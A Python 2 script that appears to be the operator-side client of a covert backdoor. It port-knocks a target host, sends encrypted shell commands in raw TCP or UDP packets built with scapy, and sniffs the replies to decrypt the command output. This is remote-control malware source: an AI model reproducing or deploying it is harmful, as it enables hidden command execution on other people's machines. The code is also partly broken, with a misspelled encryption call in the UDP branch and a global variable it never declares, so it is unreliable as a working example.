#!/usr/bin/python

import time, configfile, logging, encryption, packetFunctions
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

# flag to determine when to stop reading the results of a command and decrypt everything
flag = False

encryptedResults = ""

def portKnock():
    for knock in configfile.knock:
        packet = IP(dst=configfile.ip)/UDP(sport=knock, dport=7000)
        send(packet)
        time.sleep(1)

def sendCommand(protocol, data, password):
    if protocol == "tcp":
        packet = IP(dst=configfile.ip)/TCP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data, configfile.password))
    if protocol == "udp":
        packet = IP(dst=configfile.ip)/UDP(dport=8000, sport=7999)/Raw(load=encryption.ecrypt(password+data, configfile.password))
    send(packet)

def recvCommand(packet):
   global flag
   if packet.haslayer(IP):
    if packet[IP].src == configfile.ip:
        dataReceived = packetFunctions.parsePacket(packet)
        encryptedResults += dataReceived
        # encrypted data should be a string of either 1 or 2 characters
        # appent those characters to the global encrypted string
        if packet.haslayer(Raw):
            if packet[Raw].load == configfile.password:
                flag = True
                decryptedData = encryption.decrypt(encryptedResults, configfile.password)
                print decryptedData
                # decrypt that global encrypted string here, print it, and then set it to "" again

        # data = encryption.decrypt(packet['Raw'].load, configfile.password)
        # if data.startswith(configfile.password):
        #     data = data[len(configfile.password):]
        #     print data

def main():
    global var
    portKnock()

    while 1:
        command = raw_input("Enter command: ")
        sendCommand(configfile.protocol, command, configfile.password)
        sniff(filter='dst port 8000 and src port 8000', count=1, prn=recvCommand)

if __name__ == '__main__':
    main()
